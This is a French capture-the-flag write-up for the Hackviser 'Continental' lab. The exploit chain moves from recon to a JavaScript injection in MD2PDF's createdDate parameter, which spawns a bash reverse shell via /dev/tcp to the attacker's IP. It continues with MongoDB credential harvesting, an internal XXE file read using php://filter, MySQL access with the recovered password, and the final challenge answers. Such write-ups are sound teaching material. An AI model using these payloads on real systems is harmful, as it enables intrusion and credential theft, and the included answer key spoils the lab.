# Write-up Hackviser : Continental 🏨

Ce scénario de niveau **Hard** sur la plateforme Hackviser met en scène une chaîne d'exploitation complexe allant de l'Exécution de Code à Distance (RCE) sur un serveur de réservation public jusqu'à l'injection d'entités XML (XXE) sur un serveur interne masqué.

---

## 🔍 Étape 1 : Reconnaissance initiale

La première étape commence par un scan réseau sur le domaine cible `reservia.hv`.

```bash
nmap -sV -T4 reservia.hv
```

* **IP de Reservia** : `172.20.22.124`
* **Ports ouverts** : 22 (SSH) et 80 (HTTP).

Le site web est un portail de réservation d'hôtels. L'énumération des répertoires ne donne rien de flagrant, mais l'analyse du fonctionnement des réservations révèle l'utilisation de **MD2PDF** pour générer des confirmations de séjour.

---

## 💣 Étape 2 : Exploitation de Reservia (RCE)

En interceptant la requête de réservation, on identifie un paramètre vulnérable : `createdDate`. L'application exécute du code JavaScript côté serveur pour traiter cette date.

### L'Exploit

Nous utilisons un payload JavaScript pour forcer le serveur à nous renvoyer un **Reverse Shell** via `child_process.execSync`.

**Payload (URL encodé) :**

```text
createdDate=---js%0a((require(%22child_process%22)).execSync(%22bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[VOTRE_IP]%2F80%200%3E%261'%22))%0a---
```

En lançant un écouteur `nc -lnvp 80` sur notre machine, nous obtenons un accès en tant qu'utilisateur `aurora`.

---

## 🗄️ Étape 3 : Post-Exploitation (MongoDB)

Une fois sur le système, le fichier `.env` révèle des identifiants **MongoDB** :
`mongodb://root:MVpPdAUTr3aQ8eap2GCeaLth@localhost:27017`

En fouillant la base `reservia`, nous identifions deux Jefferson. Le "Crow" est **Jefferson Tippin**.

* **Identité** : Jefferson Tippin
* **Hôtel** : Vegas Suites
* **Dates** : 16 au 19 Juin 2023
* **Clé d'authentification** : `1e4b514d-05b6-44f7-9b40-dddfbc889e22`

---

## 🛰️ Étape 4 : Découverte du réseau et Pivotement

Un scan réseau depuis le shell Reservia révèle un autre hôte sur le même sous-réseau : `172.20.22.57` (Phantom / Vegas Suites). Ce serveur héberge un service `reservation_listener.php` inaccessible de l'extérieur.

### Exploitation XXE (XML External Entity)

Le serveur interne traite les réservations au format XML. Nous utilisons une injection XXE pour extraire les fichiers sensibles, notamment la configuration de la base de données.

**Commande depuis le shell Reservia :**

```bash
curl -i -X POST http://172.20.22.57/reservation_listener.php \
  -H "Content-Type: application/xml" \
  -H "x-auth-key: 1e4b514d-05b6-44f7-9b40-dddfbc889e22" \
  --data '<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/database/connect.php">
]>
<reservation>
  <name>&xxe;</name>
  <email>jtippin4y@unknownmail.com</email>
  <dateFrom>2023-06-16</dateFrom>
  <dateTo>2023-06-19</dateTo>
  <guestCount>1</guestCount>
  <childrenCount>0</childrenCount>
</reservation>'
```

Le serveur renvoie le contenu de `connect.php` encodé en **Base64**. Une fois décodé, nous obtenons les identifiants MySQL :

* **User** : `root`
* **Pass** : `NscNN36PGp3ZVaHEUxmuLh6D`

---

## 🔑 Étape 5 : Accès MySQL et Flag Final

Le port MySQL (3306) étant accessible via le réseau interne, nous nous connectons à la base de données `hotel`.

```bash
mysql -h 172.20.22.57 -u root -p'NscNN36PGp3ZVaHEUxmuLh6D' --protocol=tcp --skip-ssl
```

### Requête de fin

En cherchant la véritable réservation du Crow (et non nos tests d'injection), nous trouvons l'entrée correspondante :

```sql
SELECT * FROM reservations WHERE name = 'Jefferson Tippin';
```

| ID | Name | Room Number |
|----|------|-------------|
| 496 | Jefferson Tippin | **881D** |

---

## 🏁 Réponses aux Questions

1. **Nom du site** : Reservia
2. **Nom complet du Crow** : Jefferson Tippin
3. **Hôtel** : Vegas Suites
4. **Dates de séjour** : 2023-06-16 au 2023-06-19
5. **Numéro de chambre** : **881D**

---
*Write-up rédigé pour Aurel.*
